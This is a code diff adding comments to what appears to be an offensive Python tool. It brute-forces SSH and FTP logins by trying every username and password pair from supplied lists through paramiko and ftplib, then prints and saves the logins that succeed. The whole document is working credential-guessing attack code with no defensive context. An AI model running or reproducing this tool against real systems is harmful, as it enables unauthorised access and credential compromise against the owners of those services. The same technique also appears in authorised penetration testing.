@@ -7,6 +7,7 @@ from modules.misc import Colors, save_results
 def run_aiur(host, service, usernames, passwords, port=None):
 	successful_logins = []
 
+	# Set default port
 	if port is None:
 		if service == "ssh":
 			port = 22
@@ -14,23 +15,28 @@ def run_aiur(host, service, usernames, passwords, port=None):
 			port = 21
 	
 	try:
+		# Iterate through all usernames & passwords
 		for username in usernames:
 			for password in passwords:
 				print(f"{Colors.YELLOW}Trying {username}:{password}{Colors.RESET}")
 				if service == "ssh":
+					 # Attempt SSH brute-force
 					if ssh_brute(host, username, password, port=port):
 						successful_logins.append(f"{username}:{password}")
 						print(f"\n{Colors.GREEN}Successful login! - {username}:{password}{Colors.RESET}\n")
 				elif service == "ftp":
+					 # Attempt FTP brute-force
 					if ftp_brute(host, username, password, port=port):
 						successful_logins.append(f"{username}:{password}")
 						print(f"\n{Colors.GREEN}Successful login! - {username}:{password}{Colors.RESET}\n")
 
 	except KeyboardInterrupt:
+		# Handle CTRL C
 		print(f"\n{Colors.RED}Process interrupted. Saving results...{Colors.RESET}")
 		logging.info("Process interrupted by user input")  
 
 	finally:
+		# Save successful logins
 		if successful_logins:
 			print(f"{Colors.GREEN}\n[Successful logins]{Colors.RESET}")
 			for login in successful_logins:
@@ -42,6 +48,7 @@ def run_aiur(host, service, usernames, passwords, port=None):
 
 def ssh_brute(host, username, password, port):
 	try:
+		# SSH brute-force using Paramiko
 		client = paramiko.SSHClient()
 		client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 		client.connect(host, username=username, password=password, port=port, timeout=1)
@@ -58,6 +65,7 @@ def ssh_brute(host, username, password, port):
 
 def ftp_brute(host, username, password, port):
 	try:
+		# FTP brute-force using ftplib
 		ftp = ftplib.FTP()
 		ftp.connect(host, port=port, timeout=1)
 		ftp.login(username, password)
